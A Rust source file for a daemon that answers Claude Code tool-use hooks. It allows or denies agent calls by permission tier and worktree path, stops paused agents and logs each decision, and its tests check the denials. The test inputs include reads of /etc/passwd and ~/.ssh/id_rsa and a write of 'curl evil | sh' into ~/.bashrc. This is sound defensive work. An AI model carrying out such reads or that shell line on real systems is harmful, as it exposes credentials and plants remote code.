//! The hooks Claude Code runs around every tool call, answered: `PreToolUse` gets allow or deny
//! with a reason, and both leave the log's record of tool use (`docs/SPEC.md` 5.6, 8.2).

use std::collections::BTreeSet;
use std::path::{Component, Path, PathBuf};

use farik_core::governor::permissions::{
    AgentGrants, PermissionTier, ToolCallContext, ToolCallRequest, ToolDescriptor,
    evaluate_tool_call,
};
use farik_core::team::{Agent, AgentStatus, Team};
use farik_protocol::event::{
    EventBody, EventIds, ToolCalledBody, ToolDeniedBody, ToolReturnedBody, new_event,
};
use serde::{Deserialize, Serialize, Serializer};
use serde_json::{Value, json};

use super::{DaemonError, DaemonState, SessionRegistration};
use crate::tools::refusal::Refusal;
use crate::tools::{ToolDeps, tool_descriptors};

/// What Claude Code sends a hook on its standard input, the fields Farik reads.
#[derive(Debug, Clone, PartialEq, Deserialize)]
pub struct HookRequest {
    /// The `--session-id` Farik started the session with.
    pub session_id: String,
    /// The directory the session runs in, as Claude Code reports it.
    pub cwd: PathBuf,
    /// `PreToolUse` or `PostToolUse`.
    pub hook_event_name: String,
    /// The tool called: a built-in's name, or `mcp__<server>__<tool>`.
    pub tool_name: String,
    /// The call's input.
    pub tool_input: Value,
    /// The call's id, which pairs a `PreToolUse` with its `PostToolUse`.
    pub tool_use_id: Option<String>,
    /// What the tool returned, on a `PostToolUse`.
    pub tool_response: Option<Value>,
    /// How long it took, on a `PostToolUse`.
    pub duration_ms: Option<u64>,
}

/// The answer to a `PreToolUse` hook.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HookDecision {
    /// Whether the call may go ahead.
    pub allow: bool,
    /// Why; for a deny, the refusal's kind in `snake_case`, then `: `, then what it says.
    pub reason: String,
}

impl HookDecision {
    fn deny(reason: String) -> Self {
        Self {
            allow: false,
            reason,
        }
    }
}

/// Claude Code's `hookSpecificOutput` shape, which is its format and not Farik's.
impl Serialize for HookDecision {
    fn serialize<S: Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        json!({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": if self.allow { "allow" } else { "deny" },
                "permissionDecisionReason": self.reason,
            }
        })
        .serialize(serializer)
    }
}

/// How much of a call's input or output the log keeps.
const RECORD_LIMIT_BYTES: usize = 4_096;
/// What ends a value the log kept only part of.
const CUT_MARKER: &str = "[cut at 4 KiB]";
/// The prefix Claude Code gives the tools of Farik's own MCP server.
const FARIK_PREFIX: &str = "mcp__farik__";
/// The largest integer a JSON number holds exactly, and the schema's ceiling for one.
const JSON_SAFE_INTEGER: u64 = 9_007_199_254_740_991;
/// Why an allowed call was allowed.
const ALLOWED: &str = "allowed by the governor";
/// The kind of the denial of every call of a session told to stop.
const SESSION_STOPPED: &str = "session_stopped";

/// The tier a Claude Code built-in tool needs, or `None` for one no session may call: `Bash`
/// above all, because a session's shell is `farik_exec` (ADR 0004).
#[must_use]
pub fn builtin_tool_tier(tool: &str) -> Option<PermissionTier> {
    match tool {
        // `ToolSearch` only lists tools, and may be how Claude Code reaches Farik's.
        "Read" | "Glob" | "Grep" | "LS" | "ToolSearch" => Some(PermissionTier::Read),
        "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => Some(PermissionTier::WriteWorkspace),
        "WebFetch" | "WebSearch" => Some(PermissionTier::Network),
        _ => None,
    }
}

/// Decides one `PreToolUse` hook and records the decision, `tool.called` or `tool.denied`. It
/// refuses, in this order: a session the daemon does not know (`unknown_session`); an agent that
/// is not active (`agent_not_active`); a session at its `max_tool_calls` (`tool_call_limit`); a
/// tool that is neither Farik's nor a built-in with a tier (`tool_not_allowed`); a built-in's path
/// outside the session's worktree (`path_outside_workspace`); and whatever `evaluate_tool_call`
/// refuses. A decision the log cannot record is a deny (`record_failed`). Only an allowed call
/// counts towards the limit, and the count is checked and raised under one lock, because Claude
/// Code runs read tools in parallel.
#[must_use]
pub fn decide_pre_tool_use(request: &HookRequest, state: &DaemonState) -> HookDecision {
    let deps = state.deps();
    let mut sessions = state.sessions();
    let Some(session) = sessions.get_mut(&request.session_id) else {
        let reason = format!(
            "unknown_session: the daemon answers for no session {}",
            request.session_id
        );
        let ids = EventIds {
            session_id: Some(request.session_id.clone()),
            ..deps.ids.clone()
        };
        return record_decision(deps, ids, request, Err(reason));
    };
    let verdict = match &session.stop_reason {
        Some(reason) => Err(Denial::from(format!("{SESSION_STOPPED}: {reason}"))),
        None => judge(request, &session.registration, session.tool_calls, deps),
    };
    let verdict = verdict.map_err(|denial| {
        if let Some(stop) = denial.stop {
            session.stop_reason.get_or_insert_with(|| stop.to_string());
            state.stops().notify_waiters();
        }
        denial.reason
    });
    let decision = record_decision(deps, ids_of(deps, &session.registration), request, verdict);
    if decision.allow {
        session.tool_calls += 1;
    }
    decision
}

/// Why a call is denied, and the stop the denial asks of the session when it asks one: an agent
/// the human paused or retired stops at its next tool call (F1).
struct Denial {
    reason: String,
    stop: Option<&'static str>,
}

impl From<String> for Denial {
    fn from(reason: String) -> Self {
        Self { reason, stop: None }
    }
}

/// Records one `PostToolUse` hook as `tool.returned`, its output cut at 4 KiB.
///
/// # Errors
///
/// `Io` when the log does not take the event.
pub fn record_post_tool_use(request: &HookRequest, state: &DaemonState) -> Result<(), DaemonError> {
    let deps = state.deps();
    let ids = state.sessions().get(&request.session_id).map_or_else(
        || EventIds {
            session_id: Some(request.session_id.clone()),
            ..deps.ids.clone()
        },
        |session| ids_of(deps, &session.registration),
    );
    let output = request
        .tool_response
        .as_ref()
        .map_or_else(String::new, |response| cut(response.to_string()));
    append(
        deps,
        ids,
        EventBody::ToolReturned(ToolReturnedBody {
            tool: request.tool_name.clone(),
            tool_use_id: request.tool_use_id.clone(),
            output,
            // The schema's ceiling is the largest integer JSON holds exactly.
            duration_ms: request
                .duration_ms
                .and_then(|ms| i64::try_from(ms.min(JSON_SAFE_INTEGER)).ok()),
        }),
    )
    .map_err(|detail| DaemonError::Io { detail })
}

/// Whether the call may go ahead, or why it may not.
fn judge(
    request: &HookRequest,
    registration: &SessionRegistration,
    tool_calls: u32,
    deps: &ToolDeps,
) -> Result<(), Denial> {
    let team = deps
        .files
        .read_team()
        .map_err(|error| format!("team_unreadable: {error}"))?;
    let agent = match team
        .agents
        .iter()
        .find(|agent| agent.id.as_str() == registration.agent_id)
    {
        Some(agent) if agent.status == AgentStatus::Active => agent,
        found => {
            let status = found.map(|agent| agent.status);
            return Err(Denial {
                reason: Refusal::AgentNotActive {
                    agent_id: registration.agent_id.clone(),
                    status,
                }
                .reason(),
                stop: Some(if status == Some(AgentStatus::Paused) {
                    "agent paused by the user"
                } else {
                    "agent retired by the user"
                }),
            });
        }
    };
    judge_call(request, registration, tool_calls, deps, &team, agent).map_err(Denial::from)
}

/// Whether an active agent's call may go ahead, or the reason it may not.
fn judge_call(
    request: &HookRequest,
    registration: &SessionRegistration,
    tool_calls: u32,
    deps: &ToolDeps,
    team: &Team,
    agent: &Agent,
) -> Result<(), String> {
    if tool_calls >= registration.limits.max_tool_calls {
        return Err(format!(
            "tool_call_limit: the session has made the {} tool calls it may make",
            registration.limits.max_tool_calls
        ));
    }
    let (tier, paths) = match request.tool_name.strip_prefix(FARIK_PREFIX) {
        // A Farik tool is asked with no paths here: `call_tool` asks again with its real ones.
        Some(name) => match tool_descriptors().iter().find(|tool| tool.name == name) {
            Some(tool) => (tool.tier, Vec::new()),
            None => return Err(not_allowed(&request.tool_name)),
        },
        None => match builtin_tool_tier(&request.tool_name) {
            Some(tier) => (
                tier,
                workspace_paths(&request.tool_name, &request.tool_input, &registration.cwd)?,
            ),
            None => return Err(not_allowed(&request.tool_name)),
        },
    };
    let allowed_paths = match &registration.task_id {
        Some(task) => deps
            .files
            .read_contract(task)
            .map_err(|error| format!("contract_unreadable: {error}"))?
            .allowed_paths
            .iter()
            .map(ToString::to_string)
            .collect(),
        None => Vec::new(),
    };
    evaluate_tool_call(
        &ToolCallRequest {
            tool: ToolDescriptor {
                name: request.tool_name.clone(),
                tier,
            },
            paths,
            input_hash: String::new(),
        },
        &AgentGrants {
            tiers: agent.tiers().into_iter().collect::<BTreeSet<_>>(),
            preauthorized_external_tools: BTreeSet::new(),
        },
        &ToolCallContext {
            allowed_paths,
            protected_paths: team.rules().protected_paths,
            approved_calls: Vec::new(),
        },
    )
    .map_err(|refusal| Refusal::Tool(refusal).reason())
}

fn not_allowed(tool: &str) -> String {
    format!(
        "tool_not_allowed: {tool} is neither a Farik tool nor a built-in tool with a tier, and no \
         other tool is served to a session"
    )
}

/// The paths a built-in's call touches, relative to the session's worktree. The path and the
/// worktree are both resolved through symlinks, so that a committed link out of the worktree is
/// judged by where it points; one outside the worktree is refused, reads included, because a
/// session's files are its worktree's and nothing else on the machine (spec 8.6). The worktree
/// itself, and a search with no path, contribute none.
fn workspace_paths(tool: &str, input: &Value, cwd: &Path) -> Result<Vec<String>, String> {
    if tool == "Glob"
        && let Some(pattern) = input.get("pattern").and_then(Value::as_str)
        && (Path::new(pattern).is_absolute()
            || parts(pattern).any(|part| part == "..")
            || expands_home(pattern))
    {
        return Err(outside(pattern));
    }
    let field = match tool {
        "Read" | "Write" | "Edit" | "MultiEdit" => "file_path",
        "NotebookEdit" => "notebook_path",
        "Glob" | "Grep" | "LS" => "path",
        _ => return Ok(Vec::new()),
    };
    let Some(raw) = input.get(field).and_then(Value::as_str) else {
        return Ok(Vec::new());
    };
    if expands_home(raw) {
        return Err(outside(raw));
    }
    let root = cwd.canonicalize().map_err(|error| {
        format!(
            "path_outside_workspace: the session's worktree {} cannot be resolved: {error}",
            cwd.display()
        )
    })?;
    let resolved = resolve(&cwd.join(raw)).ok_or_else(|| outside(raw))?;
    let relative = resolved.strip_prefix(&root).map_err(|_| outside(raw))?;
    if relative.as_os_str().is_empty() {
        return Ok(Vec::new());
    }
    Ok(vec![
        relative
            .components()
            .map(|part| part.as_os_str().to_string_lossy())
            .collect::<Vec<_>>()
            .join("/"),
    ])
}

/// A path's or a pattern's parts, split at either separator.
fn parts(path: &str) -> impl Iterator<Item = &str> {
    path.split(['/', '\\'])
}

/// Whether a part of `path` starts with `~`: Claude Code expands a leading `~` or `~user` to a
/// home directory before the tool runs, so the path the hook would judge, under the worktree, is
/// not the one the tool touches. Every such part is refused, not only a leading one, because a
/// file whose name starts with `~` is never worth the doubt.
fn expands_home(path: &str) -> bool {
    parts(path).any(|part| part.starts_with('~'))
}

/// `path` through its symlinks: its nearest existing ancestor canonicalised, and the rest, which
/// does not exist yet, appended. `None` when the rest climbs with `..`, which nothing that does
/// not exist can be resolved through.
fn resolve(path: &Path) -> Option<PathBuf> {
    path.ancestors().find_map(|ancestor| {
        let existing = ancestor.canonicalize().ok()?;
        let rest = path.strip_prefix(ancestor).ok()?;
        rest.components()
            .all(|part| matches!(part, Component::Normal(_)))
            .then(|| existing.join(rest))
    })
}

fn outside(path: &str) -> String {
    format!("path_outside_workspace: {path} is outside the session's worktree")
}

/// The ids a session's events carry: its agent, itself, and its task.
fn ids_of(deps: &ToolDeps, registration: &SessionRegistration) -> EventIds {
    EventIds {
        task_id: registration.task_id.clone(),
        agent_id: Some(registration.agent_id.clone()),
        session_id: Some(registration.session_id.clone()),
        ..deps.ids.clone()
    }
}

/// Records a verdict and answers with it, or with `record_failed` when the log would not take it.
fn record_decision(
    deps: &ToolDeps,
    ids: EventIds,
    request: &HookRequest,
    verdict: Result<(), String>,
) -> HookDecision {
    let tool = request.tool_name.clone();
    let tool_use_id = request.tool_use_id.clone();
    let (body, decision) = match verdict {
        Ok(()) => (
            EventBody::ToolCalled(ToolCalledBody {
                tool,
                tool_use_id,
                input: cut(request.tool_input.to_string()),
            }),
            HookDecision {
                allow: true,
                reason: ALLOWED.to_string(),
            },
        ),
        Err(reason) => (
            EventBody::ToolDenied(ToolDeniedBody {
                tool,
                tool_use_id,
                reason: reason.clone(),
            }),
            HookDecision::deny(reason),
        ),
    };
    match append(deps, ids, body) {
        Ok(()) => decision,
        Err(detail) => HookDecision::deny(format!("record_failed: {detail}")),
    }
}

fn append(deps: &ToolDeps, ids: EventIds, body: EventBody) -> Result<(), String> {
    let event = new_event(body, deps.clock.now(), ids)
        .map_err(|error| format!("the event cannot be stamped: {error:?}"))?;
    let appended = deps.log.append(&event).map_err(|error| error.to_string())?;
    deps.projections
        .apply(&appended)
        .map_err(|error| error.to_string())
}

/// `text` whole when it fits in 4 KiB, or cut at the last character boundary that leaves room
/// for the marker, and the marker appended, so that what the log keeps is at most 4 KiB.
fn cut(text: String) -> String {
    if text.len() <= RECORD_LIMIT_BYTES {
        return text;
    }
    let mut end = RECORD_LIMIT_BYTES - CUT_MARKER.len();
    while !text.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}{CUT_MARKER}", &text[..end])
}

#[cfg(test)]
mod tests {
    use farik_core::budget::DEFAULT_SESSION_LIMITS;
    use farik_core::budget::SessionLimits;
    use farik_protocol::event::{EventBody, EventKind};
    use serde_json::{Value, json};

    use super::{HookDecision, HookRequest, cut, decide_pre_tool_use, record_post_tool_use};
    use crate::daemon::fixtures::{DEV_SESSION, POST_READ, PRE_READ, PRE_WRITE, TestDaemon};
    use crate::tools::fixtures::a_team_of_three;

    fn denied_for(decision: &HookDecision, kind: &str) {
        assert!(!decision.allow, "{decision:?}");
        assert!(
            decision.reason.starts_with(&format!("{kind}: ")),
            "{decision:?}"
        );
    }

    #[test]
    fn reads_the_hook_input_claude_code_sends() {
        for (fixture, tool, event) in [
            (PRE_READ, "Read", "PreToolUse"),
            (PRE_WRITE, "Write", "PreToolUse"),
            (POST_READ, "Read", "PostToolUse"),
        ] {
            let request: HookRequest =
                serde_json::from_str(fixture).expect("a recorded input reads");
            assert_eq!(request.tool_name, tool);
            assert_eq!(request.hook_event_name, event);
            assert_eq!(request.session_id, DEV_SESSION);
            assert!(
                request
                    .tool_use_id
                    .as_deref()
                    .is_some_and(|id| id.starts_with("toolu_")),
                "{request:?}"
            );
            assert_eq!(request.tool_response.is_some(), event == "PostToolUse");
        }
        let post: HookRequest = serde_json::from_str(POST_READ).expect("reads");
        assert_eq!(
            post.tool_response.expect("a response")["file"]["content"],
            json!("hello\n")
        );
        assert_eq!(post.duration_ms, Some(8));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn allows_a_read_inside_the_worktree_and_records_it() {
        let daemon = TestDaemon::new("hook-read", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": daemon.inside("src/a.rs") })),
            &daemon.state,
        );
        assert!(decision.allow, "{decision:?}");
        let called = daemon.events(EventKind::ToolCalled);
        assert_eq!(called.len(), 1);
        let ids = &called[0].envelope.ids;
        assert_eq!(ids.session_id.as_deref(), Some(DEV_SESSION));
        assert_eq!(ids.agent_id.as_deref(), Some("dev-a"));
        assert_eq!(
            ids.task_id.as_ref().map(|id| id.to_string()).as_deref(),
            Some("FRK-1")
        );
        let EventBody::ToolCalled(body) = &called[0].body else {
            panic!("a tool.called event carries a tool.called body");
        };
        assert_eq!(body.tool, "Read");
        assert!(body.input.contains("src/a.rs"), "{}", body.input);
        assert!(daemon.events(EventKind::ToolDenied).is_empty());
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_read_outside_the_worktree() {
        let daemon = TestDaemon::new("hook-outside", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": "/etc/passwd" })),
            &daemon.state,
        );
        denied_for(&decision, "path_outside_workspace");
        let denied = daemon.events(EventKind::ToolDenied);
        assert_eq!(denied.len(), 1);
        let EventBody::ToolDenied(body) = &denied[0].body else {
            panic!("a tool.denied event carries a tool.denied body");
        };
        assert_eq!(body.reason, decision.reason);
        assert!(daemon.events(EventKind::ToolCalled).is_empty());
        for (tool, input) in [
            ("Grep", json!({ "pattern": "root", "path": "/etc" })),
            ("LS", json!({ "path": "/etc" })),
            (
                "MultiEdit",
                json!({ "file_path": "/etc/passwd", "edits": [{ "old_string": "a", "new_string": "b" }] }),
            ),
            (
                "NotebookEdit",
                json!({ "notebook_path": "/etc/n.ipynb", "new_source": "" }),
            ),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call(tool, &input), &daemon.state);
            assert!(!decision.allow, "{tool}: {decision:?}");
            denied_for(&decision, "path_outside_workspace");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_read_and_a_write_of_a_protected_path() {
        let daemon = TestDaemon::new("hook-protected", |_| {});
        for (tool, input) in [
            ("Read", json!({ "file_path": daemon.inside(".env") })),
            (
                "Write",
                json!({ "file_path": daemon.inside(".env"), "content": "KEY=1" }),
            ),
            (
                "Write",
                json!({ "file_path": daemon.inside("src/server.pem"), "content": "" }),
            ),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call(tool, &input), &daemon.state);
            assert!(!decision.allow, "{tool} {input}: {decision:?}");
            denied_for(&decision, "path_protected");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn records_a_tool_call_s_input_cut_at_four_kib() {
        let daemon = TestDaemon::new("hook-input", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call(
                "Write",
                &json!({ "file_path": daemon.inside("src/a.rs"), "content": "x".repeat(10_000) }),
            ),
            &daemon.state,
        );
        assert!(decision.allow, "{decision:?}");
        let called = daemon.events(EventKind::ToolCalled);
        assert_eq!(called.len(), 1);
        let EventBody::ToolCalled(body) = &called[0].body else {
            panic!("a tool.called event carries a tool.called body");
        };
        assert!(body.input.len() <= 4_096, "{}", body.input.len());
        assert!(body.input.ends_with("[cut at 4 KiB]"), "{}", body.input);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn records_the_return_of_a_session_it_no_longer_answers_for() {
        let daemon = TestDaemon::new("hook-ended", |_| {});
        daemon.state.end_session(DEV_SESSION);
        let request: HookRequest =
            serde_json::from_value(daemon.recorded(POST_READ)).expect("reads");
        record_post_tool_use(&request, &daemon.state).expect("recorded");
        let returned = daemon.events(EventKind::ToolReturned);
        assert_eq!(returned.len(), 1);
        let ids = &returned[0].envelope.ids;
        assert_eq!(ids.session_id.as_deref(), Some(DEV_SESSION));
        assert_eq!(ids.agent_id, None);
        assert_eq!(ids.task_id, None);
    }

    #[test]
    fn cuts_a_value_at_a_character_boundary_and_keeps_one_that_fits() {
        let fits = "a".repeat(4_096);
        assert_eq!(cut(fits.clone()), fits);
        // The cut would fall at byte 4,082, inside an `é`, since every `é` starts at an odd byte.
        let wide = format!("a{}", "é".repeat(3_000));
        assert!(!wide.is_char_boundary(4_096 - "[cut at 4 KiB]".len()));
        let kept = cut(wide);
        assert_eq!(kept.len(), 4_081 + "[cut at 4 KiB]".len());
        assert!(kept.ends_with("é[cut at 4 KiB]"), "{kept}");
        let over = "a".repeat(4_097);
        assert_eq!(cut(over).len(), 4_096);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_read_through_a_symlink_out_of_the_worktree() {
        let daemon = TestDaemon::new("hook-symlink", |repo| {
            std::os::unix::fs::symlink("/etc/passwd", repo.path.join("notes"))
                .expect("the link is made");
            repo.commit("a link out");
        });
        assert!(daemon.worktree.join("notes").is_symlink());
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": daemon.inside("notes") })),
            &daemon.state,
        );
        denied_for(&decision, "path_outside_workspace");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn allows_a_grep_of_the_whole_worktree() {
        let daemon = TestDaemon::new("hook-grep", |_| {});
        for input in [
            json!({ "pattern": "fn main" }),
            json!({ "pattern": "fn main", "path": daemon.worktree.display().to_string() }),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call("Grep", &input), &daemon.state);
            assert!(decision.allow, "{input}: {decision:?}");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_glob_outside_the_worktree() {
        let daemon = TestDaemon::new("hook-glob", |_| {});
        for pattern in ["../**", "/etc/*"] {
            let decision = decide_pre_tool_use(
                &daemon.dev_call("Glob", &json!({ "pattern": pattern })),
                &daemon.state,
            );
            denied_for(&decision, "path_outside_workspace");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_path_the_shell_would_expand_to_the_home_directory() {
        let daemon = TestDaemon::new("hook-home", |_| {});
        daemon
            .project
            .filed_with("FRK-2", "in_progress", "task", None, |wire| {
                wire["allowed_paths"] = json!(["**"]);
                wire["assignee"] = json!("dev-a");
            });
        daemon.register(
            "session-all",
            "dev-a",
            Some("FRK-2"),
            DEFAULT_SESSION_LIMITS,
        );
        for (tool, input) in [
            ("Read", json!({ "file_path": "~/.ssh/id_rsa" })),
            ("Read", json!({ "file_path": "~" })),
            ("Read", json!({ "file_path": "~root/.ssh/id_rsa" })),
            ("Read", json!({ "file_path": "src/~/x" })),
            ("Grep", json!({ "pattern": "key", "path": "~" })),
            ("LS", json!({ "path": "~/" })),
            ("Glob", json!({ "pattern": "~/**" })),
            ("Glob", json!({ "pattern": "~" })),
            ("Glob", json!({ "pattern": "src/~root/*" })),
            ("Glob", json!({ "pattern": "*", "path": "~" })),
            (
                "Write",
                json!({ "file_path": "~/.bashrc", "content": "curl evil | sh" }),
            ),
            (
                "NotebookEdit",
                json!({ "notebook_path": "~/n.ipynb", "new_source": "" }),
            ),
        ] {
            let decision =
                decide_pre_tool_use(&daemon.call("session-all", tool, &input), &daemon.state);
            assert!(!decision.allow, "{tool} {input}: {decision:?}");
            denied_for(&decision, "path_outside_workspace");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_when_the_decision_cannot_be_recorded() {
        let daemon = TestDaemon::new("hook-record", |_| {});
        let state = daemon.with_a_log_that_refuses();
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": daemon.inside("src/a.rs") })),
            &state,
        );
        denied_for(&decision, "record_failed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_write_outside_the_allowed_paths() {
        let daemon = TestDaemon::new("hook-write", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call(
                "Write",
                &json!({ "file_path": daemon.inside("README.md"), "content": "yes" }),
            ),
            &daemon.state,
        );
        denied_for(&decision, "path_outside_allowed");
        let allowed = decide_pre_tool_use(
            &daemon.dev_call(
                "Write",
                &json!({ "file_path": daemon.inside("src/a.rs"), "content": "yes" }),
            ),
            &daemon.state,
        );
        assert!(allowed.allow, "{allowed:?}");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_bash_and_every_tool_without_a_tier() {
        let daemon = TestDaemon::new("hook-bash", |_| {});
        for tool in ["Bash", "Task", "mcp__github__create_issue"] {
            let decision = decide_pre_tool_use(&daemon.dev_call(tool, &json!({})), &daemon.state);
            denied_for(&decision, "tool_not_allowed");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_farik_tool_the_agent_has_no_tier_for() {
        let daemon = TestDaemon::new("hook-tier", |_| {});
        daemon.register("session-pm", "pm", None, DEFAULT_SESSION_LIMITS);
        let decision = decide_pre_tool_use(
            &daemon.call(
                "session-pm",
                "mcp__farik__farik_exec",
                &json!({ "command": "true" }),
            ),
            &daemon.state,
        );
        denied_for(&decision, "tier_not_granted");
        let read = decide_pre_tool_use(
            &daemon.call("session-pm", "mcp__farik__farik_read_board", &json!({})),
            &daemon.state,
        );
        assert!(read.allow, "{read:?}");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_an_unknown_session_and_a_paused_agent() {
        let daemon = TestDaemon::new("hook-session", |_| {});
        let read = json!({ "file_path": daemon.inside("src/a.rs") });
        let unknown = decide_pre_tool_use(&daemon.call("nobody", "Read", &read), &daemon.state);
        denied_for(&unknown, "unknown_session");
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                wire["agents"][1]["status"] = json!("paused");
            }))
            .expect("the team is written");
        let paused = decide_pre_tool_use(&daemon.dev_call("Read", &read), &daemon.state);
        denied_for(&paused, "agent_not_active");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_every_call_of_a_stopped_session() {
        let daemon = TestDaemon::new("hook-stopped", |_| {});
        assert!(
            daemon
                .state
                .request_stop(DEV_SESSION, "stopped by the human")
        );
        assert_eq!(
            daemon.state.stop_reason(DEV_SESSION).as_deref(),
            Some("stopped by the human")
        );
        let read = json!({ "file_path": daemon.inside("src/a.rs") });
        let decision = decide_pre_tool_use(&daemon.dev_call("Read", &read), &daemon.state);
        assert!(!decision.allow, "{decision:?}");
        assert_eq!(decision.reason, "session_stopped: stopped by the human");
        assert!(!daemon.state.request_stop("nobody", "stopped by the human"));
        assert_eq!(daemon.state.stop_reason("nobody"), None);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn stops_the_session_of_an_agent_paused_in_the_team_file() {
        let daemon = TestDaemon::new("hook-paused-stops", |_| {});
        assert_eq!(daemon.state.sessions_of("dev-a"), vec![DEV_SESSION]);
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                wire["agents"][1]["status"] = json!("paused");
            }))
            .expect("the team is written");
        let read = json!({ "file_path": daemon.inside("src/a.rs") });
        let paused = decide_pre_tool_use(&daemon.dev_call("Read", &read), &daemon.state);
        denied_for(&paused, "agent_not_active");
        assert_eq!(
            daemon.state.stop_reason(DEV_SESSION).as_deref(),
            Some("agent paused by the user")
        );
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_past_the_tool_call_limit() {
        let daemon = TestDaemon::new("hook-limit", |_| {});
        daemon.register(
            DEV_SESSION,
            "dev-a",
            Some("FRK-1"),
            SessionLimits {
                max_tool_calls: 2,
                ..DEFAULT_SESSION_LIMITS
            },
        );
        let read = daemon.dev_call("Read", &json!({ "file_path": daemon.inside("src/a.rs") }));
        let denied = decide_pre_tool_use(&daemon.dev_call("Bash", &json!({})), &daemon.state);
        denied_for(&denied, "tool_not_allowed");
        assert_eq!(
            daemon.state.tool_calls(DEV_SESSION),
            Some(0),
            "a denied call does nothing"
        );
        for _ in 0..2 {
            assert!(decide_pre_tool_use(&read, &daemon.state).allow);
        }
        let third = decide_pre_tool_use(&read, &daemon.state);
        denied_for(&third, "tool_call_limit");
        assert_eq!(daemon.state.tool_calls(DEV_SESSION), Some(2));
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn records_a_tool_return_cut_at_four_kib() {
        let daemon = TestDaemon::new("hook-return", |_| {});
        let mut wire = daemon.recorded(POST_READ);
        wire["tool_response"]["file"]["content"] = json!("é".repeat(5_000));
        let request: HookRequest = serde_json::from_value(wire).expect("reads");
        record_post_tool_use(&request, &daemon.state).expect("recorded");
        let returned = daemon.events(EventKind::ToolReturned);
        assert_eq!(returned.len(), 1);
        let EventBody::ToolReturned(body) = &returned[0].body else {
            panic!("a tool.returned event carries a tool.returned body");
        };
        assert!(body.output.len() <= 4_096, "{}", body.output.len());
        assert!(body.output.len() > 4_000, "{}", body.output.len());
        assert!(body.output.ends_with("[cut at 4 KiB]"), "{}", body.output);
        assert_eq!(body.tool, "Read");
        assert_eq!(body.duration_ms, Some(8));
        assert_eq!(
            body.tool_use_id.as_deref(),
            Some("toolu_01AGrQNrawzN2RTTvmfBahB4")
        );
        assert_eq!(
            returned[0].envelope.ids.session_id.as_deref(),
            Some(DEV_SESSION)
        );
    }

    #[test]
    fn serialises_a_decision_as_claude_code_reads_it() {
        let shape = |decision: &str, reason: &str| -> Value {
            json!({
                "hookSpecificOutput": {
                    "hookEventName": "PreToolUse",
                    "permissionDecision": decision,
                    "permissionDecisionReason": reason
                }
            })
        };
        let deny = HookDecision {
            allow: false,
            reason: "tool_not_allowed: no".to_string(),
        };
        assert_eq!(
            serde_json::to_value(&deny).expect("serialises"),
            shape("deny", "tool_not_allowed: no")
        );
        let allow = HookDecision {
            allow: true,
            reason: "allowed".to_string(),
        };
        assert_eq!(
            serde_json::to_value(&allow).expect("serialises"),
            shape("allow", "allowed")
        );
    }
}
